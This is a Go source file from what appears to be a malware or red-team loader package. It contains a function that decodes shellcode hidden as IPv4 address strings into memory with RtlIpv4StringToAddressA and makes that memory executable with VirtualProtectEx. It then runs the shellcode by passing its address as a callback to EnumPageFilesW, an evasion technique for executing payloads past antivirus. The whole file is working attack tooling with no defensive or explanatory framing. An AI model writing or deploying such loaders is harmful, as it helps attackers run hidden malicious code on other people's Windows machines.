package loader

import (
	"unsafe"
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func Ipv4AddressA(shellcode []string) {
	addr, adErr := xwindows.AllocADsMem(uintptr(len(shellcode) * 4))
	if addr == 0 {
		log.Fatalf("AllocADsMem failed: %v", adErr)
	}

	addrPtr := addr
	for _, ipv4 := range shellcode {
		u := append([]byte(ipv4), 0)

		_, err := xwindows.RtlIpv4StringToAddressA(
			uintptr(unsafe.Pointer(&u[0])),
			uintptr(0),
			uintptr(unsafe.Pointer(&u[0])),
			addrPtr,
		)
		if err != nil && err.Error() != "The operation completed successfully." {
			log.Fatalf("RtlIpv4StringToAddressA failed: %v", err)
		}

		addrPtr += 4
	}

	oldProtect := windows.PAGE_READWRITE
	vpErr := xwindows.VirtualProtectEx(
		windows.CurrentProcess(),
		addr,
		uintptr(len(shellcode)*4),
		windows.PAGE_EXECUTE_READWRITE,
		(*uint32)(unsafe.Pointer(&oldProtect)),
	)
	if vpErr != nil {
		log.Fatalf("AlloVirtualProtectEx failed: %v", vpErr)
	}

	_, pfErr := xwindows.EnumPageFilesW(addr, 0)
	if pfErr != nil {
		log.Fatalf("EnumPageFilesW failed: %v", pfErr)
	}
}
